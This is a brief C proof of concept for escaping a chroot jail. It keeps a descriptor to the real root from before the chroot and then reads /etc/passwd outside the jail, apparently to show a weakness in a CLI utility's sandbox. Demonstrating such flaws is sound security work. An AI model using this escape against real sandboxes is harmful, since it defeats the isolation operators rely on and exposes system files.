/**
 * gcc -o escape_fd escape_fd.c
 * sudo ./escape_fd
 */

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
    // fd to the real root, before chrooting
    int outside_fd = open("/", O_RDONLY);
    if (outside_fd < 0) {
        perror("open");
        return 1;
    }

    // fully "enter" the jail, as the CLI utility does
    if (chroot("/tmp/jail") != 0 || chdir("/") != 0) {
        perror("chroot/chdir");
        return 1;
    }

    int fd = openat(outside_fd, "etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("openat");
        return 1;
    }

    char line[128];
    read(fd, line, sizeof(line));
    printf("Escaped the jail, read: %s", line);

    close(fd);
    return 0;
}